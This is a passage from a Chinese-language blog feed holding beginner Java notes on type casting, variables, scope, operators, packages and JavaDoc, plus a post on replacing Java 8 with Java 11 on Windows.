class="comment">//============================================================</span></span><br><span class="line">        <span class="comment">//布尔拓展</span></span><br><span class="line">        <span class="comment">//============================================================</span></span><br><span class="line">        <span class="keyword">boolean</span> flag=<span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(flag=<span class="keyword">true</span>)&#123;&#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;&#125;</span><br><span class="line">        <span class="comment">//less is more 代码要精简</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>java强类型语言，所以进行有些运算的时候，需要用到类型转换</p><blockquote><p>低—————————————————————————-&gt;高</p><p>byte,short,char -&gt; int -&gt; long  -&gt;float -&gt; double</p><p>强制转换 （类型）变量名  高到低</p><p>自动转换  低到高</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo05</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">128</span>;</span><br><span class="line">        <span class="keyword">byte</span> b = (<span class="keyword">byte</span>) i;</span><br><span class="line">        <span class="comment">//强制转换</span></span><br><span class="line">        System.out.println(i); <span class="comment">//128</span></span><br><span class="line">        System.out.println(b); <span class="comment">//-128 发生了内存溢出</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        注意点:</span></span><br><span class="line"><span class="comment">        1. 不能对布尔值进行转换</span></span><br><span class="line"><span class="comment">        2. 不能把对象类型转换为不相干的类型</span></span><br><span class="line"><span class="comment">        3. 把高容量转换到低容量的时候，强制转换</span></span><br><span class="line"><span class="comment">        4. 转换的时候可能会存在内容溢出，或者精度问题</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println((<span class="keyword">int</span>)<span class="number">23.7</span>);</span><br><span class="line">        System.out.println((<span class="keyword">int</span>)-<span class="number">45.89f</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">int</span> d= c+<span class="number">1</span>;</span><br><span class="line">        System.out.println(d);</span><br><span class="line">        System.out.println((<span class="keyword">char</span>) d);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单拓展</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo06</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//操作比较大的数时，容易出现溢出问题</span></span><br><span class="line">        <span class="comment">// jdk7之后有一个特性，数字之间可以用下划线分开</span></span><br><span class="line">        <span class="keyword">int</span> money= <span class="number">10_0000_0000</span>;</span><br><span class="line">        <span class="keyword">int</span> years= <span class="number">20</span>;</span><br><span class="line">        <span class="keyword">int</span>  total =money*years; <span class="comment">//结果发生了内存溢出很正常</span></span><br><span class="line">        <span class="keyword">long</span> total3 =(<span class="keyword">long</span>)(money*years);  <span class="comment">//在强制类型转换之前已经发生了溢出</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> total4=money*(<span class="keyword">long</span>)years; <span class="comment">//这种是正确的写法</span></span><br><span class="line"></span><br><span class="line">        System.out.println(total4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="变量、常量、作用域"><a href="#变量、常量、作用域" class="headerlink" title="变量、常量、作用域"></a>变量、常量、作用域</h3><p>java作为一种强类型的语言，每个变量必须声明其类型</p><p>java变量的要素包括，<strong>变量名，变量类型和作用域</strong></p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><blockquote><p>type varName [=value] [{, varName [=value]}];</p><p>//数据类型 变量名=值；可以使用逗号隔开来声明多个同类型变量(不推荐)。</p></blockquote><p>注意事项：</p><ul><li> 每一个变量都有类型，类型可以是基本类型，也可以是引用类型</li><li>变量名必须是合法的标识符</li><li>变量声明是一条完整的语句，因此每一个声明都必须以分号结束</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo07</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//int a,b,c;</span></span><br><span class="line">        <span class="comment">//int a=1,b=2,c=3; //把变量写在一起程序的可读性较差</span></span><br><span class="line">        String name=<span class="string">&quot;M0th&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span> x =<span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        <span class="keyword">double</span> pi =<span class="number">3.14</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><ul><li>类变量</li><li>实例变量</li><li>局部变量</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dome08</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//类变量 static</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">double</span> salary=<span class="number">2500</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 属性：变量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例变量：从属于对象；如果不进行初始化，这个类型的默认值 0 0.0</span></span><br><span class="line">    <span class="comment">//bool值：默认是false</span></span><br><span class="line">    <span class="comment">//除了基本类型，其余的默认值都是null</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="comment">//main 方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//局部变量;必须声明和初始化值</span></span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">10</span>;</span><br><span class="line">        System.out.println(i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//变量类型 变量名字</span></span><br><span class="line">        Dome08 demo08 = <span class="keyword">new</span> Dome08();</span><br><span class="line">        System.out.println(demo08.age);</span><br><span class="line">        System.out.println(demo08.name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//类变量 static</span></span><br><span class="line">        System.out.println(salary);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//其他方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo09</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>  <span class="keyword">final</span> <span class="keyword">double</span> PI =<span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">final</span>  <span class="keyword">static</span> <span class="keyword">double</span> PI2=<span class="number">3.1415926</span>;</span><br><span class="line">    <span class="comment">//static 和 final 都是修饰符 不分先后</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(PI);</span><br><span class="line">        System.out.println(PI2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h3><ul><li>所有变量、方法、类名：见名知意</li><li>类成员变量：首字母小写和驼峰原则：monthSalary 除了第一个单词之外，后面所有的单词首字母大写</li><li>局部变量： 首字母小写和驼峰原则</li><li>常量：大写字母和下划线：MAX_VALUE</li><li>类名：首字母代谢和驼峰原则</li><li>方法名：首字母小写和驼峰原则</li></ul><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>算数运算符：+，-，*，、，%，++，–</li><li>复制运算符 =</li><li>关系运算符：&gt;， &lt; ，&gt;=，&lt;=，==，instanceof</li><li>逻辑运算符：&amp;&amp;，||，！</li><li>位运算符：&amp;，|，^，~，&gt;&gt;，&lt;&lt;，&gt;&gt;&gt;</li><li>条件运算符 ?:</li><li>扩展赋值运算符：+=，-=，*=， /=</li></ul><h4 id="自增自减、Math类"><a href="#自增自减、Math类" class="headerlink" title="自增自减、Math类"></a>自增自减、Math类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//++ -- 自增，自减， 一元运算符</span></span><br><span class="line">        <span class="keyword">int</span> a=<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> b =a++; <span class="comment">//执行完这行代码后，先给b赋值，再自增</span></span><br><span class="line">        <span class="comment">//a = a+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//a = a+1</span></span><br><span class="line">        <span class="keyword">int</span> c=++a; <span class="comment">//执行完这行代码前,先自增,再给b赋值</span></span><br><span class="line"></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> pow = Math.pow(<span class="number">3</span>,<span class="number">2</span>); <span class="comment">//很多运算我通过引入一些类来运算</span></span><br><span class="line">        System.out.println(pow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="逻辑运算符、位运算符"><a href="#逻辑运算符、位运算符" class="headerlink" title="逻辑运算符、位运算符"></a>逻辑运算符、位运算符</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 与（and） 或（or） 非（取反）</span></span><br><span class="line">        <span class="keyword">boolean</span>  a = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">boolean</span>  b = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;a &amp;&amp; b&quot;</span>+(b &amp;&amp; a));</span><br><span class="line">        System.out.println(<span class="string">&quot;a || b:&quot;</span>+( a || b));</span><br><span class="line">        System.out.println(<span class="string">&quot;!(a&amp;&amp;b) :&quot;</span>+!(a &amp;&amp; b));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//短路运算</span></span><br><span class="line">        <span class="keyword">int</span> c =<span class="number">5</span> ;</span><br><span class="line">        <span class="keyword">boolean</span>  d =(c&lt;<span class="number">4</span>)&amp;&amp;(c++&lt;<span class="number">4</span>); </span><br><span class="line">        System.out.println(d);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo04</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        A = 0011 1100</span></span><br><span class="line"><span class="comment">        B = 0000 1101</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        A&amp;B=0000 1100</span></span><br><span class="line"><span class="comment">        A|B=0011 1101</span></span><br><span class="line"><span class="comment">        A^B=0011 0001</span></span><br><span class="line"><span class="comment">        ~B =1111 0010</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         2*8 =16  2*2*2*2 运算快</span></span><br><span class="line"><span class="comment">         &lt;&lt; *2</span></span><br><span class="line"><span class="comment">         &gt;&gt; /2</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(<span class="number">2</span>&lt;&lt;<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo05</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// x ? y: z</span></span><br><span class="line">        <span class="comment">//如果 x ==true ，则结果为y， 否则结果为z</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> score =<span class="number">80</span>;</span><br><span class="line">        String type=score &lt; <span class="number">60</span>?<span class="string">&quot;不及格&quot;</span>:<span class="string">&quot;及格&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(type);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h3><ul><li><p>为了更好的组织类，java引入了包机制，用于区别类名的命名空间</p></li><li><p>包语句的语法格式：</p><p><code>package pkg1[.pkg2[.pkg3...]]</code></p></li><li><p>一般利用公司域名倒置作为包名</p></li><li><p>为了能够使用一个包的成员，我们需要在java程序中明确导入该包。使用“import”语句即可</p><p><code>import package1[.package2...].(classname|*)</code></p></li></ul><h3 id="JavaDoc生成文档"><a href="#JavaDoc生成文档" class="headerlink" title="JavaDoc生成文档"></a>JavaDoc生成文档</h3><p>javadoc 命令是用来生成自己的api文档的</p><p>参数信息</p><ul><li>@author 作者</li><li>@version 版本号</li><li>@since 需要指明最早使用的jdk版本</li><li>@param 参数名</li><li>@return 返回值情况</li><li>@throws 异常抛出情况</li></ul><p><img src="/2021/03/28/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20210404093449474.png" class="lazyload" data-srcset="/2021/03/28/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20210404093449474.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210404093449474"></p><p><img src="/2021/03/28/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20210404093529124.png" class="lazyload" data-srcset="/2021/03/28/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20210404093529124.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210404093529124"></p>]]></content>
      
      
      <categories>
          
          <category> java学习之路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java开发环境准备</title>
      <link href="2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
      <url>2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<p>我想尝试一下java11 的TLS 版本，而我以前装的版本是java8，所以在这个博客中我想记录一下java的删除与安装，和java开发神器IDEA的使用</p><span id="more"></span><h3 id="JDK-JRE-JVM"><a href="#JDK-JRE-JVM" class="headerlink" title="JDK JRE JVM"></a>JDK JRE JVM</h3><blockquote><p>JDK ： Java Development</p><p>JRE ： Java Runtime Environment</p><p>JVM ：Java Virtual Machine</p></blockquote><p>三者关系如下图</p><p><img src="https://img-blog.csdnimg.cn/20181102183439614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDc5MDQx,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20181102183439614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDc5MDQx,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="java8的卸载"><a href="#java8的卸载" class="headerlink" title="java8的卸载"></a>java8的卸载</h3><p>java的卸载是一件相对繁琐的事情</p><ul><li><p>删除注册表：</p><p>WIN +R regedit</p><p>找到 HKEY_LOCAL_MACHINE/SOFTWARE/JavaSoft</p><p>将JavaSoft文件夹及其子文件目录删除</p></li><li><p>删除环境变量</p><p>计算机-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量</p><ul><li>删除 JAVA_HOME变量</li><li>删除 CLASSPATH 变量</li><li>删除 Path变量 里的 <code>%JAVA_HOME\bin; %JAVA_HOME%\jre\bin</code></li></ul></li><li><p>删除windows文件夹下的赋值文件</p><p>将C盘中的Windows\System32 和 Windows\SysWOW64文件夹下的java.exe javaw.exe 和javaws.exe 删除</p></li><li><p>删除程序JAVA</p><p>控制面板 卸载程序 </p></li><li><p>cmd 测试 </p></li></ul><h3 id="java11的安装"><a href="#java11的安装" class="headerlink" title="java11的安装"></a>java11的安装</h3><p><a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">jdk11下载地址</a></p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326205830748.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326205830748.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326205830748"></p><p>更改路径即可</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326205921969.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326205921969.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326205921969"></p><h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><p>跟java1.8有些不一样，java11不在需要添加jre的路径，也不存在jre文件</p><h5 id="创建JAVA-HOME"><a href="#创建JAVA-HOME" class="headerlink" title="创建JAVA_HOME"></a>创建JAVA_HOME</h5><p><code>D:\Java\jdk11</code></p><h5 id="添加PATH"><a href="#添加PATH" class="headerlink" title="添加PATH"></a>添加PATH</h5><p><code>%JAVA_HOME%\bin</code></p><p>至于很多教程上的 CLASSPATH 配置，这是个历史遗留的问题，早在jdk1.6时代配置还需要，但是现在早已经不需要了（jdk1.8都不需要）</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326215844326.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326215844326.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326215844326"></p><h3 id="hello-world-测试"><a href="#hello-world-测试" class="headerlink" title="hello world!测试"></a>hello world!测试</h3><p>新建一个java文件</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326222924593.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326222924593.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326222924593"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">System.out.print(<span class="string">&quot;hello,world!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326220939552.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326220939552.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326220939552"></p><h3 id="编译型与解释型语言"><a href="#编译型与解释型语言" class="headerlink" title="编译型与解释型语言"></a>编译型与解释型语言</h3><p>java既是编译型语言也是解释型语言</p><p><img src="https://image.fundebug.com/2019-01-24-01.png" class="lazyload" data-srcset="https://image.fundebug.com/2019-01-24-01.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Java到底是编译型语言还是解释型语言？ | Fundebug博客- 一行代码搞定BUG监控-  网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source 